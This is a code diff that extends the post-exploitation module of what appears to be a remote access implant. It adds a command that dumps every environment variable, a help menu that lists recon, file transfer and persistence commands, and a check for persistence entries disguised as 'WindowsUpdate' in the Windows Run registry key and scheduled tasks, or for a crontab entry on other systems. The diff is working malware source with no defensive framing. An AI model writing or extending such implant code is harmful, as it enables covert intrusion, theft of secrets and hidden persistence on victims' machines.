@@ -2,12 +2,19 @@ def postex(command):
     import os, sys, base64, socket, getpass
     op = command[5:] if str(command).startswith('__px:') else command
     try:
-        if op == 'ps':
+        if op in ('ps', 'processes'):
             import subprocess
             if sys.platform == 'win32':
                 out = subprocess.check_output(['tasklist', '/FO', 'CSV', '/NH'], text=True, timeout=15)
                 return out[:8000]
             return subprocess.check_output(['ps', '-ax', '-o', 'pid,comm'], text=True, timeout=15)[:8000]
+        if op == 'env':
+            items = sorted(os.environ.items())
+            return '\n'.join('%s=%s' % (k, v) for k, v in items)[:8000]
+        if op == 'help':
+            return ('postex commands: ps, processes, recon, screenshot, env, '
+                    'download:<path>, upload:<path>:<b64>, '
+                    'persist[:registry|schtask|remove], persist_check')
         if op == 'recon':
             host = socket.gethostname()
             user = getpass.getuser()
@@ -41,6 +48,8 @@ def postex(command):
             with open(path, 'wb') as fh:
                 fh.write(data)
             return 'uploaded %d bytes' % len(data)
+        if op == 'persist_check':
+            return _postex_persist_check()
         if op.startswith('persist:'):
             method = op.split(':', 1)[1]
             return _postex_persist(method)
@@ -154,3 +163,38 @@ def _postex_persist(method):
         return 'Error: unknown persist method (use: reg, registry, schtask, remove)'
     except Exception as e:
         return 'Error: persist failed: %s' % e
+
+
+def _postex_persist_check():
+    import sys, os
+    found = []
+    if sys.platform == 'win32':
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                r'Software\Microsoft\Windows\CurrentVersion\Run',
+                                0, winreg.KEY_READ)
+            try:
+                val, _, _ = winreg.QueryValueEx(key, 'WindowsUpdate')
+                found.append('registry: %s' % val)
+            except FileNotFoundError:
+                pass
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+        try:
+            import subprocess
+            r = subprocess.run(['schtasks', '/query', '/tn', 'WindowsUpdate'],
+                               capture_output=True, text=True, timeout=15)
+            if r.returncode == 0:
+                found.append('schtask: WindowsUpdate')
+        except Exception:
+            pass
+    else:
+        agent_path = os.path.abspath(sys.argv[0])
+        cron_check = os.popen('crontab -l 2>/dev/null').read()
+        if agent_path in cron_check:
+            found.append('crontab')
+    if found:
+        return 'Persistence found:\n' + '\n'.join('  - %s' % f for f in found)
+    return 'No persistence mechanisms detected'
